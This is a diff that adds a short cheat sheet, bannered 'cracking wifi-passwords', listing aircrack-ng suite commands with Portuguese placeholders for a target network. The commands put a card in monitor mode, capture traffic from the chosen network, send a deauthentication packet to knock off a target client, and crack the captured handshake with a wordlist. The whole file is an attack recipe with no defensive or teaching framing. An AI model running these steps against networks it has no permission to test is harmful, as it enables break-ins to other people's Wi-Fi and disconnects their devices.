@@ -1,0 +1,14 @@
+
+                        __   _                             _ _____                                                     __    
+  ______________ ______/ /__(_)___  ____ _       _      __(_) __(_)     ____  ____ ____________      ______  _________/ /____
+ / ___/ ___/ __ `/ ___/ //_/ / __ \/ __ `/      | | /| / / / /_/ /_____/ __ \/ __ `/ ___/ ___/ | /| / / __ \/ ___/ __  / ___/
+/ /__/ /  / /_/ / /__/ ,< / / / / / /_/ /       | |/ |/ / / __/ /_____/ /_/ / /_/ (__  |__  )| |/ |/ / /_/ / /  / /_/ (__  ) 
+\___/_/   \__,_/\___/_/|_/_/_/ /_/\__, /        |__/|__/_/_/ /_/     / .___/\__,_/____/____/ |__/|__/\____/_/   \__,_/____/  
+                                 /____/                             /_/                                                      
+
+[+] root@kali:~# airmon-ng start wlan0 
+[+] root@kali:~# airodump-ng wlan0mon 
+[+] root@kali:~# airodump-ng -c (canal da rede alvo) --bssid (bssid da rede alvo) wlan0mon -w (arquivo) wlan0mon 
+[+] root@kali:~# aireplay-ng -0 1 -a(bssid da rede alvo) -c(cliente alvo) wlan0mon 
+[+] root@kali:~# wireshark (arquivo)
+[+] root@kali:~# aircrack-ng -w(wordlist) -b(bssid) (arquivo)
